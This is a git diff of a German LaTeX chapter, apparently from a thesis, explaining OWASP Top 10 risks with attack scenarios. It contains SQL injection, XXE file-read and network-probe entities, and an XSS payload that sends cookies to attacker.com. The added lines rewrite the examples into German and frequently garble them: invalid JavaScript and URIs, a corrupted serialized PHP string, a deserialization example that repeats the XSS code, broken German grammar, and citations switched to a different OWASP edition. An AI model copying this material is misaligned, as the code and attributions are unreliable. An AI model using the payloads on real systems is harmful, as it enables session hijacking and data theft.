@@ -9,9 +9,9 @@ Eine lückenlose Sicherheit ist in der IT kaum realisierbar, da jede verwendete 
 
 \subsection{OWASP Top 10 Risiken}
 
-\subsubsection{Injection}
+\subsubsection{Injektion}
 
-Injektion-Schwachstellen wie SQL-, NoSQL-, OS- und LDAP-Injection treten dann auf, wenn Daten, die als Teil einer Datenabfrage oder Teil eines Befehls von einem Interpreter bearbeitet werden, nicht vertrauenswürdig sind\cite[6]{owasp17top10}. Simple textbasierte Angriffe werden vom Angreifer versendet, mit dem Ziel die Syntax des Zielinterpreters zu missbrauchen. Wenn eine Anwendung nicht vertrauenswürdige Daten an einen Interpreter weiterleitet, können Injection-Schwachstellen auftreten. Dabei kann fast jede erdenkliche Datenquelle, auch interne Datenquellen, die Form eines Injection-Vektors annehmen. Sie sind besonders in veralteten Codes weit verbreitet. Man kann sie in SQL-, LDAP-, XPath und NoSQL-Anfragen, in Betriebssystembefehlen sowie in XML, SMTP-Headern, Parametern oder Ähnlichen finden. Eine Einfach Variante Injection-Schwachstellen zu entdecken ist es, eine Code-Prüfung durchzuführen. Mit Hilfe von externen Tests verhält es sich ein wenig schwieriger. Angreifer setzen dazu Scanner und Fuzzer ein. Folgen einer Injection können Datenverlust oder -verfälschung, Fehlen von Zurechenbarkeit oder Zugangssperren sein. Vollständige Systemübernahmen können im schlimmsten Fall folgen.\cite[7]{owasp17top10}.\\
+Injektion-Schwachstellen kommen dann auf, wenn die Daten, die als Bestandteil einer Datenabfrage oder Teil eines Befehls von einem Interpreter bearbeitet werden, nicht vertrauenswürdig sind. Simple textbasierte Angriffe werden vom Angreifer versendet, mit dem Ziel die Syntax des Zielinterpreters zu missbrauchen. Wenn keine vertrauenswürdige Daten durch einen Webanwendungen einen Interpreter weitergeleitet werden, können Injektion-Problemen auftreten. Dabei kann fast jede erdenkliche Datenquelle, auch interne Datenquellen, die Form eines Injection-Vektors annehmen. Sie sind besonders in veralteten Codes weit verbreitet. Man kann sie in den Anfragen wie NoSQL und SQL, in den Befehlen von Betriebssysteme wie z.B. in XML, SMTP-Headern oder Ähnlichen gefunden werden. Eine Einfach Variante Injektion-Problemen zu entdecken ist es, eine Code-Prüfung durchzuführen. Mit Hilfe von externen Tests verhält es sich ein wenig schwieriger. Dazu werden durch Hackern Scanner und Fuzzer eingesetzt. Folgen einer Injektion können Datenverfälschung oder Datenverfälschung, Fehlen von Zurechenbarkeit oder Zugangssperren sein. Vollständige Systemübernahmen können im schlimmsten Fall folgen.\cite{owasp13top10}.\\
 
 \textbf{Mögliche Angriffsszenarien:}\\
 
@@ -20,31 +20,31 @@ Stellen Sie sich vor, ein Entwickler muss die Kontonummern und Salden für die a
 
 
 \begin{LaTeXCode}[caption={SQL Abfrage Beispiel 1},captionpos=b, label=LaTeXCode:inj1][numbers=none]
-String accountBalanceQuery = 
-"SELECT accountNumber, balance FROM accounts WHERE account_owner_id = " 
-+ request.getParameter("user_id");
+String kontostandAbfrage = 
+"SELECT kontoNummer, kontostand FROM konten WHERE konto\_besitzer\_id = " 
++ anfrage.gibParameter("user_id");
 
 try
 {
-	Statement statement = connection.createStatement();
-	ResultSet rs = statement.executeQuery(accountBalanceQuery);
-	while (rs.next()) {
-		page.addTableRow(rs.getInt("accountNumber"), rs.getFloat("balance"));
+	Statement statementVar = connection.createStatement();
+	ResultSet resultSet = statementVar.executeQuery(kontostandAbfrage);
+	while (resultSet.next()) {
+		page.addTableRow(rs.gibInt("kontoNummer"), resultSet.getFloat("kontostand"));
 	}
 } catch (SQLException e) { ... }
 \end{LaTeXCode}
 
-Der Benutzer ist im Normalfall mit der ID 984 angemeldet und kann folgende URL besuchen:
+Der Benutzer ist im Normalfall mit der ID 150 angemeldet und kann folgende URL besuchen:
 
-\texttt{https://bankingwebsite/show\_balances?user\_id=984}
+\texttt{https://beispielwebseite/zeig\_kontostand?user\_id=150}
 
-Dies bedeutet, dass accountBalanceQuery am Ende wie bei dem Listing \ref{LaTeXCode:inj2} aussehen würde.
+Dies bedeutet, dass kontostandAbfrage am Ende wie bei dem Listing \ref{LaTeXCode:inj2} aussehen würde.
 
 \begin{LaTeXCode}[caption={Account Balance Query},captionpos=b, label=LaTeXCode:inj2][numbers=none]
-SELECT accountNumber, balance FROM accounts WHERE account_owner_id = 984
+SELECT kontonummer, kontostand FROM konten WHERE konto_besitzer_id = 150
 \end{LaTeXCode}
 
-Indem auf der Seite neue Zeilen hinzugefügt werden, wird dies an die Datenbank übergeben und die Konten und Salden für Benutzer 984 werden zurückgegeben damit sie angezeigt werden können.
+Indem auf der Seite neue Zeilen hinzugefügt werden, wird dies an die Datenbank übergeben und die Konten und Salden für Benutzer 150 werden zurückgegeben damit sie angezeigt werden können.
 
 Parameter \texttt{user\_id} kann von einem Angreifer so verändert werden, dass er wie bei der \ref{LaTeXCode:inj3} aufgefasst werden kann:
 
@@ -55,44 +55,45 @@ Parameter \texttt{user\_id} kann von einem Angreifer so verändert werden, dass 
 Und dies führt dazu;
 
 \begin{LaTeXCode}[caption={Account Balance Query},captionpos=b, label=LaTeXCode:inj4][numbers=none]
-SELECT accountNumber, balance FROM accounts WHERE account_owner_id = 0 OR 1=1
+SELECT kontoNummer, kontostand FROM konten WHERE konto_besitzer_id = 0 OR 1=1
 \end{LaTeXCode}
 
 Durch die Übergabe der Abfrage \ref{LaTeXCode:inj4} an die Datenbank, werden alle von ihr gespeicherten Kontonummern und Salden zurückgegeben und auf der Seite werden allen hinzugefügten Zeilen angezeigt. Der Angreifer kennt somit nun die Kontonummern und Salden jeglicher Benutzer.
 
 \subsubsection{Fehler in Authentifizierung und Session-Management}
 
-Angreifer können Passwörter oder Session-Token offenlegen oder so ausnutzen, dass die Identität anderer Benutzer angenommen werden kann, wenn Anwendungsfunktionen, die die Authentifizierung und das Session-Management umsetzen, falsch implementiert werden.\cite[6]{owasp17top10}. Dabei können Angreifer Sicherheitslücken beim Session-Management oder der Authentifizierung (z.B. ungeschützte Nutzerkonten, Passwörter, Session-IDs) nutzen, um sich unautorisiert Zugang zu einer fremden Identität zu verschaffen. Authentifizierungs- und Session-Managemententwickler setzen oft auf eigene Lösungen, obwohl bekannt ist, dass dies besonders schwierig und individuelle Lösungen anfällig sind. Fehler bei der Wiedererkennung des Benutzers, bei Abmeldung und Passwortmanagement, bei Timeouts, Sicherheitsabfragen können beispielsweise auftreten. Das Auffinden dieser Fehler kann sehr schwierig sein, besonders wenn es sich um individuelle Implementierungen handelt. Solche Fehler können zur Kompromittierung von Benutzerkonten führen. Sobald ein Angreifer erfolgreich ist, ist er im Besitz sämtlicher Rechte des Angegriffenen - besonderes Augenmerk der Angreifer liegt hierbei auf privilegierten Zugängen \cite[8]{owasp17top10}.\\
+Angreifer können Passwörter oder Session-Token offenlegen oder so ausnutzen, dass die Identität anderer Benutzer angenommen werden kann, wenn Anwendungsfunktionen, die die Authentifizierung und das Session-Management umsetzen, falsch implementiert werden. Dabei können Angreifer Sicherheitslücken beim Session-Management oder der Authentifizierung (z.B. ungeschützte Nutzerkonten, Passwörter, Session-IDs) nutzen, um sich unautorisiert Zugang zu einer fremden Identität zu verschaffen. Authentifizierungs- und Session-Managemententwickler setzen oft auf eigene Lösungen, obwohl bekannt ist, dass dies besonders schwierig und individuelle Lösungen anfällig sind. Fehler bei der Wiedererkennung des Benutzers, bei Abmeldung und Passwortmanagement, bei Timeouts, Sicherheitsabfragen können beispielsweise auftreten. Solche Fehlern können sehr schwierig aufgefunden werden. Außerdem können sie zur Kompromittierung von Benutzerkonten führen. Sobald ein Hacker erfolgreich ist, ist er im Besitz sämtlicher Rechte des Angegriffenen - besonderes Augenmerk der Angreifer liegt hierbei auf privilegierten Zugängen \cite{owasp13top10}.\\
 
 \textbf{Mögliche Angriffsszenarien:}\\
 
 \textbf{\textit{Szenario 1:}}\\
- Eine Flugbuchungsanwendung fügt die Session-ID in die URL ein\cite[8]{owasp17top10}:\\
+Die Session-ID wird nun durch eine Flugbuchungsanwendung   in die URL eingefügt\cite{owasp13top10}:\\
 
 
-\texttt{http://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN2JV?}
+\texttt{http://beispiel.com/auktion/auktionprodukte;jsessionid=JHLK324CJKH341234KJH?}
 
-\texttt{dest=Hawaii}\\
+\texttt{dest=Stuttgart}\\
 
-Ein authentifizierter Anwender möchte dieses Angebot seinen Freunden mitteilen. Ohne zu wissen, dass er seine Session-ID verrät, versendet er den Link per E-Mail. Nutzen seine Freunde den Link, können sie seine Session sowie zum Beispiel seine Kreditkartendaten benutzen.\\
+Dieses Auktion wird von einem Benutzer mit seiner Freunde geteilt, aber er hat gleichzeitig auch seine \texttt{Session-ID} verrät, weil er den Auktion-URL per E-Mail geschickt hat. Aus diesem Grund  haben seine Freunde die Möglichkeit, seine \texttt{Session} sowie seine Kreditkarte benutzen.\\
 
 \textbf{\textit{Szenario 2:}}\\
- Anwendungs-Timeouts sind falsch konfiguriert. Ein Anwender benutzt einen öffentlichen PC, um die Anwendung aufzurufen. Anstatt die „Abmelden“-Funktion zu benutzen, schließt der Anwender nur den Browser. Der Browser ist auch eine Stunde später noch authentifiziert, wenn ein potentieller Angreifer ihn öffnet\cite[8]{owasp17top10}.\\
+ Die Konfiguration von Anwendungs-Timeouts wurden falsch gestellt. Einen öffentlichen PC wird durch einen Anwender benutzt, um das Aufrufen der Anwendung zu realisieren. Anwender vergisst die „Logout“-Funktion zu benutzen, schließt er nur den Browser. Konto wird erst nach einer bestimmten Zeitraum unauthentifiziert, d.h. ein Hacker hat die Möglichkeit Konto authentifiziert benutzen, wenn er den Browser innerhalb dieser Zeitraum öffnet\cite{owasp13top10}.\\
 
 \subsubsection{Verlust der Vertraulichkeit sensibler Daten}
 
-Viele Anwendungen bieten keinen ausreichenden Schutz für sensible Daten, wie Kreditkartendaten oder Zugangsinformationen, was Angreifer dazu verleiten kann diese ungeschützten Daten auszulesen oder zu modifizieren um dann weitere Straftaten, wie beispielsweise Kreditkartenbetrug, oder einen Identitätsdiebstahl in Angriff zu nehmen. Mit  Hilfe von Verschlüsselungen während des Speicherns oder der Übertragung von vertraulichen Daten kann zusätzlicher Schutz gewährleistet werden - vor allem beim Hoch- und Herunterladen von Daten mit einem Internetbrowser\cite[6]{owasp17top10}. Anstatt Verschlüsselungen selbst zu durchbrechen, stehlen Angreifer in der Regel lieber Schlüssel, stehlen Klartext vom Server oder durchführen Seiten-Angriffe. Fehlende Verschlüsselung vertraulicher Daten ist die häufigste Schwachstelle. Oftmals wird bei der Nutzung von Kryptographie mit schwachen Schlüsselerzeugungen und -verwaltungen, der Nutzung schwacher Algorithmen, insbesondere für das Password Hashing, gearbeitet. Das Finden von Browser Schwachstellen ist nicht sonderlich schwer, aber dafür schwer auszunutzen. Fehler kompromittieren regelmäßig vertrauliche Daten. Dabei handelt sich oft um sensitive Daten wie beispielsweise personenbezogene Daten, Benutzernamen und Passwörter oder Kreditkarteninformationen\cite[9]{owasp17top10}.\\
+Viele Anwendungen bieten keinen ausreichenden Schutz für sensible Daten, wie Kreditkartendaten oder Zugangsinformationen, was Angreifer dazu verleiten kann diese ungeschützten Daten auszulesen oder zu modifizieren um dann weitere Straftaten, wie beispielsweise Kreditkartenbetrug, oder einen Identitätsdiebstahl in Angriff zu nehmen. Mit  Hilfe von Verschlüsselungen während des Speicherns oder der Übertragung von vertraulichen Daten kann zusätzlicher Schutz gewährleistet werden - vor allem beim Hoch- und Herunterladen von Daten mit einem Internetbrowser. Anstatt Verschlüsselungen selbst zu durchbrechen, stehlen Angreifer in der Regel lieber Schlüssel, stehlen Klartext vom Server oder durchführen Seiten-Angriffe. Fehlende Verschlüsselung vertraulicher Daten ist die häufigste Schwachstelle. Oftmals wird bei der Nutzung von Kryptographie mit schwachen Schlüsselerzeugungen und -verwaltungen, der Nutzung schwacher Algorithmen, insbesondere für das Password Hashing, gearbeitet. Das Finden von Browser Schwachstellen ist nicht sonderlich schwer, aber dafür schwer auszunutzen. Fehler kompromittieren regelmäßig die Daten, die vertraulich sind. Dabei besteht solche wichtige Daten aus personenbezogene Daten, Benutzernamen und Passwörter oder Kreditkarteninformationen\cite{owasp13top10}.\\
 
 \textbf{Mögliche Angriffsszenarien:}\\
 
 \textbf{\textit{Szenario 1:}}\\
 
-Eine Anwendung verschlüsselt Kreditkartendaten automatisch bei der Speicherung in einer Datenbank. Das bedeutet aber auch, dass durch SQL-Injection erlangte Kreditkartendaten in diesem Fall automatisch entschlüsselt werden. Besser wäre es wenn die Anwendung die Daten mit eine Public Key
-verschlüsselt hätte und nur nachgelagerte Anwendungen und nicht die Webanwendung selbst die Daten mit dem Private Key entschlüsselt hätte\cite[9]{owasp17top10}.\\
+Während dem Speicherung den Kreditkartendaten in einer Datenbank(oder Datensammlung) werden die Informationen automatisch ins Geheimschrift abgefasst. Mittels dieses Prozesses können die verschlüsselte Daten (in diesem Fall Kreditkartendaten) durch einem SQL-Injektion automatisch entschlüsselt werden. Dagegen könnten solche Informationen mit einem Public-Key-Verfahren verschlüsselt werden, d.h. die Entschlüsselung der Kreditkartendaten kann nur durch die nachgelagerte Anwendung mit einem Private-Key erfolgen\cite{owasp13top10}.\\
 
 \textbf{\textit{Szenario 2:}}\\
 
-Eine Webseite schützt die authentisierten Seiten nicht mit SSL. Der Angreifer stiehlt das Sitzungscookie des Nutzers durch einfaches Mitlesen der Kommunikation (z.B. in einem offenen WLAN). Der Angreifer kann nun durch einfaches Wiedereinspielen dieses Cookies die Sitzung des Nutzers übernehmen und Zugriff auf die privaten Daten des Nutzers erlangen \cite[9]{owasp17top10}.
+Der Schutz den authentisierte Seiten findet nicht mit SSL statt. Das Sitzungscookie eines Benutzers wird von einen Hacker durch das Mitlesen der Kommunikation gestohlen. 
+
+Der Angreifer stiehlt das Sitzungscookie des Nutzers durch einfaches Mitlesen der Kommunikation (z.B. in einem offenen WLAN). Der Angreifer kann nun durch einfaches Wiedereinspielen dieses Cookies die Sitzung des Benutzers übernehmen und kann auf die sensible Daten des Benutzers zugreifen\cite{owasp13top10}.
 
 \subsubsection{XML External Entities (XXE)}
 
@@ -104,45 +105,45 @@ Viele ältere oder schlecht konfigurierte XML-Prozessoren werten externe Entitä
 Der Angreifer versucht, Daten vom Server zu extrahieren\cite[10]{owasp17top10}:\\
 
 \begin{LaTeXCode}[caption={XML-Beispiel},captionpos=b, label=LaTeXCode:xxe1][numbers=none]
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<foo>\&xxe;</foo>
+<?xml version="1.1" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ELEMENT example ANY >
+<!ENTITY xxe SYSTEM "dokumenten:///etc/passwoerter" >]>
+<example>\&xxe;</example>
 \end{LaTeXCode}
 
 \textbf{\textit{Szenario 2:}}\\
 Das private Netzwerk des Servers wird von einem Angreifer getestet, indem er die obige Entity-Zeile wie folgt ändert\cite[10]{owasp17top10}:\\
 
 \begin{LaTeXCode}[caption={XML-Beispiel 2},captionpos=b, label=LaTeXCode:xxe2][numbers=none]
-<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
+<!ENTITY xxe SYSTEM "https://192.168.0.1/privat" >]>
 \end{LaTeXCode}
 
 \textbf{\textit{Szenario 3:}}\\
 Ein Angreifer versucht einen Denial-of-Service-Angriff, indem er eine möglicherweise endlose Datei einfügt\cite[10]{owasp17top10}:\\
 
 \begin{LaTeXCode}[caption={XML-Beispiel 3},captionpos=b, label=LaTeXCode:xxe3][numbers=none]
-<!ENTITY xxe SYSTEM "file:///dev/random" >]>
+<!ENTITY xxe SYSTEM "file:///ent/zufaellig" >]>
 \end{LaTeXCode}
 
 \subsubsection{Broken Access Control}
 
-Einschränkungen im Handlungsspielraum von authentifizierten Benutzern, werden häufig nicht konsequent und ordnungsgemäß durchgesetzt. Angreifer können diese Ungenauheiten oftmals ausnutzen, um auf nicht autorisierte Funktionen und Daten zugreifen zu können \cite[6]{owasp17top10}. Die Manipulation der für die Zugriffskontrolle notwendigen Elemente ist eine Kernkompetenz von Angreifern. Static Application Security Testing (SAST)-Tools sind in der Lage das Fehlen einer Zugriffskontrolle zu erkennen. Sie sind jedoch nicht in der Lage zu überprüfen, ob sie funktionsfähig ist, wenn sie doch vorhanden ist. Ohne automatisierte Erkennungen und wirkungsvolle Funktionstest von Entwicklern, bleiben Schwachstellen bei Zugriffskontrollen häufig bestehen. Die Erkennung solcher Kontrollen ist normalerweise weder für automatisierte statische noch für dynamische Tests geeignet. Die technische Auswirkung besteht darin, dass Angreifer sich als Benutzer oder Administrator maskieren, indem sie jegliche Datensätze erstellen, darauf zugreifen, aktualisieren oder gar löschen\cite[11]{owasp17top10}.\\
+Einschränkungen im Handlungsspielraum von authentifizierten Benutzern, werden häufig nicht konsequent und ordnungsgemäß durchgesetzt. Angreifer können diese Ungenauigkeiten oftmals ausnutzen, um auf nicht autorisierte Funktionen und Daten zugreifen zu können \cite[6]{owasp17top10}. Die Manipulation der für die Zugriffskontrolle notwendigen Elemente ist eine Kernkompetenz von Angreifern. Static Application Security Testing (SAST)-Tools sind in der Lage das Fehlen einer Zugriffskontrolle zu erkennen. Sie sind jedoch nicht in der Lage zu überprüfen, ob sie funktionsfähig ist, wenn sie doch vorhanden ist. Ohne automatisierte Erkennungen und wirkungsvolle Funktionstest von Entwicklern, bleiben Schwachstellen bei Zugriffskontrollen häufig bestehen. Die Erkennung solcher Kontrollen ist normalerweise weder für automatisierte statische noch für dynamische Tests geeignet. Die technische Auswirkung besteht darin, dass Angreifer sich als Benutzer oder Administrator maskieren, indem sie jegliche Datensätze erstellen, darauf zugreifen, aktualisieren oder gar löschen\cite[11]{owasp17top10}.\\
 
 \textbf{Mögliche Angriffsszenarien:}\\
 \\
 \textbf{\textit{Szenario 1:}}\\
 
-Die Anwendung verwendet unverifizierte Daten in einem SQL-Aufruf, der auf Kontoinformationen zugreift\cite[11]{owasp17top10}:
+Die Anwendung verwendet unverifizierte Daten in einem SQL-Aufruf, der auf Kontoinformationen zugreift\cite{owasp13top10}:
 
 \begin{LaTeXCode}[caption={Broken Access Control - Beispiel 1},captionpos=b, label=LaTeXCode:bac1][numbers=none]
-pstmt.setString(1, request.getParameter(''acct''));
-ResultSet results = pstmt.executeQuery( );
+preparedStatement.setString(2, anfrage.gibParameter(''konto''));
+ResultSet resultSet = preparedStatement.executeQuery( );
 \end{LaTeXCode}
 
-Ein Angreifer modifiziert einfach den \texttt{acct} Parameter im Browser, um die gewünschte Kontonummer zu senden. Wenn dies nicht ordnungsgemäß überprüft wurde, kann der Angreifer auf das Konto eines Benutzers zugreifen.\\
+Der Parameter \texttt{konto} im Browser wird von einem Hacker modifiziert, um erwünschte Kontoinformation zu senden. Wenn dies nicht ordnungsgemäß überprüft wurde, kann der Angreifer auf das Konto eines Benutzers zugreifen.\\
 
-\texttt{http://example.com/app/accountInfo?acct=notmyacct}\\
+\texttt{http://beispiel.com/applikation/kontoInfo?konto=nichtmeinekonto}\\
 
 \textbf{\textit{Szenario 2:}}\\
 
@@ -150,62 +151,61 @@ Ein Angreifer zwingt einfach zu Ziel-URLs. Für den Zugriff auf die Administrati
 
 \subsubsection{Sicherheitsrelevante Fehlkonfiguration}
 
-Die höchste Priorität sollte die Festlegung und Umsetzung einer sicheren Konfiguration für Anwendungen, Frameworks, Applikations-, Web- und Datenbankserver sowie deren Plattformen sein. Außerdem müssen Sicherheitseinstellungen definiert, zweckmäßig verwendet und gepflegt werden, da Voreinstellungen meist wenig Sicherheit aufweisen und die Software muss in regelmäßigen Abständen aktualisiert werden \cite[6]{owasp17top10}. Die von Angreifern benutzten Standardkonten, inaktive Seiten, ungepatchte Fehler, ungeschützte Dateien und Verzeichnisse, helfen ihnen dabei unautorisierten Zugang oder auch Informationen über das Zielsystem zu gewinnen. Sicherheitsrelevante Fehlkonfigurationen können in der Anwendung, inkl. Plattform, Web- und Anwendungsserver, oder Datenbank in jeglichen Feldern vorkommen. Deshalb ist vor allem die Zusammenarbeit zwischen Entwicklern und Administratoren wichtig, denn nur so kann eine sichere Konfiguration aller Ebenen garantiert werden. Häufig fehlende Sicherheitspatches,
-Fehlkonfigurationen, Standardkonten oder nicht benötigte Dienste können von automatisierten Scannern identifiziert werden. Diese Fehler ermöglichen den Angreifern häufig unautorisierten Zugriff auf Systemdaten oder -funktionalitäten können aber auch zur kompletten Kompromittierung des Zielsystems führen\cite[12]{owasp17top10}.\\
+Die höchste Priorität sollte die Vereinbarung und Verwirklichung einer gut gesicherten Konfiguration für Anwendungen, Applikations-, Datenbankserver, usw sein. Des Weiteren muss die Sicherheitseinstellung gut definiert, zweckmäßig verwendet und gepflegt werden, da Voreinstellungen meist wenig Sicherheit aufweisen und die Software muss in regelmäßigen Abständen aktualisiert werden. Die von Angreifern benutzten Standardkonten, inaktive Seiten, ungepatchte Fehler, ungeschützte Dateien und Verzeichnisse, helfen ihnen dabei unautorisierten Zugang oder auch Informationen über das Zielsystem zu gewinnen. Sicherheitsrelevante Fehlkonfigurationen können in der Anwendung oder Datensammlung in jeglichen Feldern vorkommen. Deshalb ist vor allem die Zusammenarbeit zwischen Entwicklern und Administratoren wichtig, denn nur so kann eine sichere Konfiguration aller Ebenen garantiert werden. Häufig fehlende Sicherheitspatches,
+Fehlkonfigurationen, Standardkonten oder nicht benötigte Dienste können von automatisierten Scannern identifiziert werden. Diese Fehler ermöglichen den Angreifern häufig unautorisierten Zugriff auf Systemdaten oder -funktionalitäten können aber auch zur kompletten Kompromittierung des Zielsystems führen\cite{owasp13top10}.\\
 
 \textbf{Mögliche Angriffsszenarien:}\\
 \\
 \textbf{\textit{Szenario 1:}}\\
 
-Die Administratorkonsole mit Standardkonto wurde nicht entfernt sondern automatisch installiert. Wenn Angreifer dies in Erfahrung bringen, können sie sich über das Standardkonto anmelden und in das System eindringen\cite[12]{owasp17top10}.\\
+Die Konsole der Administrator mit Standardbenutzerkonto wurde nicht gelöscht sondern wurde Installation automatisch stattgefunden. Wenn Angreifer dies in Erfahrung bringen, können sie sich über das Standardkonto anmelden und in das System eindringen\cite{owasp13top10}.\\
 
 \textbf{\textit{Szenario 2:}}\\
 
-Directory Listings wurden nicht deaktiviert. Angreifer können so in den Besitz aller Dateien kommen. Sie laden alle existierenden Java-Klassen herunter,
-dekompilieren diese und stellen einen schwerwiegenden Fehler in der Zugriffskontrolle fest\cite[12]{owasp17top10}.\\
+Die Deaktivierung von DL (Directory Listing) wurde nicht geschehen. Mit Hilfe dieser Situation haben die Hackern Möglichkeit die sensible Dateien zuzukommen. Sie können alle existierenden Java-Klassen herunterladen und auch diese dekompilieren und finden eine Lücke in der Zugriffskontrolle\cite{owasp13top10}.\\
 
 \textbf{\textit{Szenario 3:}}\\
 
-Durch die Konfiguration des Anwendungsservers können Stack Traces wieder zurück an den Benutzer gegeben werden. Somit können potentielle Fehler im Backend sichtbar gemacht werden. Angreifer nutzen zusätzliche Informationen in Fehlermeldungen aus\cite[12]{owasp17top10}.\\
+Durch die Bearbeitung des Anwendungsservers kann Stapelverfolgung (engl. Stacktrace) wieder zurück an den User gegeben werden. Somit können potentielle Fehler im Backend sichtbar gemacht werden. Hackern können die zusätzliche Informationen über das Zielsystem in Fehlermeldungen ausnutzen\cite{owasp13top10}.\\
 
 \textbf{\textit{Szenario 4:}}\\
 
-Bereits bekannte Sicherheitsschwachstellen bei vorinstallierten Beispielapplikationen im Applikationsserver können von Angreifern ausgenutzt werden um so den Server zu kompromittieren und Schaden zuzufügen\cite[12]{owasp17top10}.\\
+Bereits bekannte Sicherheitsschwachstellen bei vorinstallierten Beispielapplikationen im Applikationsserver können von Angreifern ausgenutzt werden um so den Server zu kompromittieren und Schaden zuzufügen\cite{owasp13top10}.\\
 
 \subsubsection{Cross-Site Scripting (XSS)}
 
-Im Falle dass eine Anwendung nicht vertrauenswürdige Daten akzeptiert und ohne entsprechende Validierung oder Umkodierung an einen Webbrowser übermittelt, können XSS-Schwachstellen auftauchen. Durch XSS kann ein Angreifer Scriptcodes im Browser eines Opfers ausführen um mit Hilfe von dieses Scriptcodes Benutzersitzungen zu übernehmen, Inhalte von Seiten zu modifizieren oder den Benutzer auf nicht vertrauenswürdige Seiten umzuleiten\cite[6]{owasp17top10}. Die vom Angreifer gesendeten textbasierten Angriffsskripte missbrauchen die Eigenschaften des Browsers und fast jede Datenquelle kann einen Angriffsvektor beinhalten, auch interne Quellen wie beispielsweise Datenbanken. XSS Schwachstellen, die die am weitesten verbreitete Schwachstelle bei webbasierten Anwendungen darstellen, treten dann auf, wenn vom Benutzer eingegebene Daten ohne hinreichend validiert zu werden von der Anwendung eingegebene Daten übernimmt und Metazeichen als Text zu kodiert. Es gibt dabei drei Typen von XSS Schwachstellen:\\
+Im Falle dass eine Anwendung unsichere Daten annimmt und solche Daten ohne entsprechende Validierung an eines Client übermittelt werden, können Cross-Site Scripting-Schwachstellen auftauchen. Durch das Cross-Site Scripting kann ein Hacker Scriptcodes im Client eines Geschädigten nutzen um mit Hilfe von dieses Scriptcodes Benutzersitzungen zu übernehmen, Inhalte von Seiten zu modifizieren oder den Benutzer auf nicht vertrauenswürdige Seiten umzuleiten. Die vom Angreifer gesendeten textbasierten Angriffsskripten missbrauchen die Merkmalen des Clients und in der Regel können fast jede Datenquelle einen Angriffsvektor beinhalten, auch die Datenbanken, die als interne Quellen gelten. XSS Schwachstellen, die die sich uneingeschränkt verbreitete Vulnerabilität bei Webanwendungen darstellen, tauchen auf, wenn vom User eingegebene Informationen ohne Kontrolle validiert zu werden von der Anwendung eingegebene Informationen übernimmt und Metadaten als Text zu kodiert. XSS-Schwachstellen besteht aus drei Teilen\cite{owasp13top10}:\\
 
 \begin{itemize}
-	\item Persistent
-	\item nichtpersistent/reflektiert und
-	\item DOM-basiert (lokal)
+	\item persistent,
+	\item reflektiert und
+	\item DOM-basiert.
 \end{itemize}
 
-Die meisten XSS-Schwachstellen sind recht simpel mit Hilfe von Tests oder Code-Analysen zu erkennen\cite[13]{owasp17top10}.
+Die XSS-Vulnerabilitäten können sehr einfach durch die Tests oder Code-Reviews erkannt werden\cite{owasp13top10}.
 
-Angreifer können durch die Ausführung von Skripten im Browser des Opfers die Session übernehmen, Webseiten verändern, andere Inhalte einfügen, Benutzer umleiten oder den Browser des Benutzers mit Malware infizieren\cite[13]{owasp17top10}.\\
+Angreifer können durch die Ausführung von Skripten im Browser des Opfers die Session übernehmen, Webseiten verändern, andere Inhalte einfügen, Benutzer umleiten oder den Browser des Benutzers mit Malware infizieren\cite{owasp13top10}.\\
 
 \textbf{Mögliche Angriffsszenarien:}\\
 \\
 \textbf{\textit{Szenario 1:}}\\
 
-Um folgenden HTML-Code zu generieren übernimmt die Anwendung nicht vertrauenswürdige Daten, welche weder auf Gültigkeit geprüft werden\cite[13]{owasp17top10}:\\
+Um folgenden HTML-Code zu generieren übernimmt die Anwendung nicht vertrauenswürdige Daten, welche weder auf Gültigkeit geprüft werden\cite{owasp13top10}:\\
 
 \begin{LaTeXCode}[caption={XXS-Beispiel 1},captionpos=b, label=LaTeXCode:xxs1][numbers=none]
-(String) page += "<input name='creditcard' type='TEXT'
-value='" + request.getParameter("CC") + "'>";
+(String) seite += "<input name='kreditkarte' type='TEXT'
+wert='" + anfrage.gibParameter("KK") + "'>";
 \end{LaTeXCode}
 
-Der Angreifer ändert den Parameter \texttt{CC} in seinem Browser auf:\\
+Der Parameter \texttt{KK} wird im Browser durch den Hacker geändert werden:\\
 
 \begin{LaTeXCode}[caption={XXS-Beispiel 2},captionpos=b, label=LaTeXCode:xxs2][numbers=none]
-<script>document.location=
-http://www.attacker.com/cgi-bin/cookie.cgi?
-foo='+document.cookie</script>
+<script>dokumente.ort=
+http://www.angreifer.com/abc-bin/cookies.abc?
+var='+dokumente.cookies</script>
 \end{LaTeXCode}
 
-Somit wird die Session-ID des Benutzers an die Seite des Angreifers gesendet, so dass der Angreifer die Möglichkeit hat die aktuelle Benutzersession zu übernehmen. Angreifer können XSS auch benutzen, um jegliche CSRF-Abwehr der Anwendung zu umgehen\cite[13]{owasp17top10}.\\
+Somit kann die Session-ID des Opfers an die Seite des Hackers geschickt, somit kann der Hacker die aktuelle Session des Users einfach übernehmen\cite{owasp13top10}.\\
 
 \subsubsection{Unsichere Deserialisierung}
 
@@ -218,33 +218,33 @@ Unsichere Deserialisierung führt oftmals zur Remote-Code-Ausführung. Deseriali
 Um ein \texttt{Super-Cookie} zu speichern, welches die Benutzer-ID, die Rolle, den Kennwort-Hash und den anderen Status des Benutzers enthält, verwendet ein PHP-Forum die PHP-Objektserialisierung\cite[13]{owasp17top10}:\\
 
 \begin{LaTeXCode}[caption={Unsichere Deserialisierung - Beispiel 1},captionpos=b, label=LaTeXCode:ud1][numbers=none]
-a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";
-i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
+b:5:{f:1;f:243;f:2;u:8:"Mallory";f:3;t:5:"benutzer";
+f:4;t:43:"c7b9c4cfb98gf1f16133g9g4d99cd171";}
 \end{LaTeXCode}
 
-Der Angreifer ändert den Parameter \texttt{CC} in seinem Browser auf:\\
+Der Parameter \texttt{KK} wird von Hacker in seinem Client geändert:\\
 
 \begin{LaTeXCode}[caption={Unsichere Deserialisierung - Beispiel 2},captionpos=b, label=LaTeXCode:ud2][numbers=none]
-	(String) page += "<input name='creditcard' type='TEXT'
-	value='" + request.getParameter("CC") + "'>";
+	(String) seite += "<input name='kreditkarte' type='TEXT'
+	wert='" + anfrage.gibParameter("KK") + "'>";
 \end{LaTeXCode}
 
